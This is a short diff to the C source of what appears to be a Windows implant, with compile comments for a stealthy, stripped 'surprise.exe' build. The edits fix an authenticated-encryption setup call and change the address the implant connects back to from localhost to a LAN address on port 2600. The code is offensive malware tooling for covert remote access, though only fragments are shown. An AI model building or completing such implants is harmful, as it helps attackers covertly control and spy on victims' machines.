@@ -1,6 +1,6 @@
 #include "implant.h"
-// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32
-// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -mwindows -s
+// Compilation command: x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32
+// futiv command : x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32 -mwindows -s
 int main(){
 // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
@@ -36,7 +36,7 @@ int main(){
 
     
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_INIT(&authInfo);
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
 
     authInfo.cbNonce = sizeof(nonce);
     authInfo.pbNonce = nonce;
@@ -149,7 +149,7 @@ int main(){
 
     server.sin_family = AF_INET;
     server.sin_port = htons(2600);
-    server.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server.sin_addr.s_addr = inet_addr("192.168.1.146");
 
     if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0) {
         closesocket(soc);
